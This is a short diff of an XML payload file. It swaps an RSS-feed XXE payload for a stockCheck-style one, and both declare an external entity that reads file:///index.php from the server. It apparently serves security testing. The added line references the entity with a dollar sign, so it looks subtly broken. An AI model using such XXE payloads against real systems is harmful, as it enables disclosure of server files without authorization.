@@ -1,15 +1,3 @@
 <?xml version="1.0" encoding="UTF-8" ?>
-<!DOCTYPE request [<!ENTITY include SYSTEM "file:///index.php">]>
-<rss version="2.0">
-  <channel>
-    <title>test Title </title>
-    <description>description</description>
-    
-    <link>http://community.local.adxstudio.com/news-feed/</link>
-        <item>
-          <title>article title</title>
-          <description>test &include;</description>
-          <link>http://community.local.adxstudio.com/news/news-articles-1/</link>
-        </item>
-  </channel>
-</rss>
+<!DOCTYPE stockCheck[<!ENTITY include SYSTEM "file:///index.php">]>
+<stockCheck>$include;</stockCheck>
